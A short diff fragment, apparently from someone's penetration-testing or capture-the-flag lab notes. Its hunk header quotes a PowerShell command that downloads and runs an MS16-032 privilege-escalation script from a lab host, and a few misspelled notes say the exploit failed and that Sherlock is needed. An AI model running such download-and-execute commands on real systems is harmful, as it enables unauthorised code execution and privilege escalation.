@@ -29,3 +29,4 @@ IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.19:8000/ms16-32.ps
 but ms 16 32 didnot wokr
 
 need to donwload sherlock first
+
